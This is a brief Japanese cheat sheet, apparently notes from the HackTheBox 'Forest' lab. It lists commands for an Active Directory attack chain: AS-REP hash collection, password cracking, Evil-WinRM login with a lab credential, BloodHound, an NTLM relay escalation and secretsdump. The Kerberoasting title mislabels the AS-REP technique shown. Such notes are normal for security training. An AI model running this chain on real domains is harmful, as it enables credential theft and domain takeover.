# Kerberoasting
- [cheetsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
## LDAP search
調査方法は様々あります、NPアカウントを調査することが目的
- autorecon
- ldapsearch
- windapsearch

## アカウント調査後
TGTチケットとhash値を取得します  
### GetNPUsers.py（Impacket）
```
python3 GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

hash値を解析します
```
john hash --fork=4 -w=/home/user/rockyou.txt
```

## パスワード取得後
リモートログインを試みます
※WinRMサービス（5985/tcp）が稼働している場合
### Evil-WinRM
```
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## 権限昇格
ドメインに対して権限昇格の方法がないか調査を試みます  
### bloodhound
```
bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
```

### NTLM Relay攻撃（Impacket）
```
sudo ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
```

### Administrator NTLM認証 ハッシュ値 ダンプ
```
secretsdump.py htb/svc-alfresco:s3rvice@10.10.10.161
```
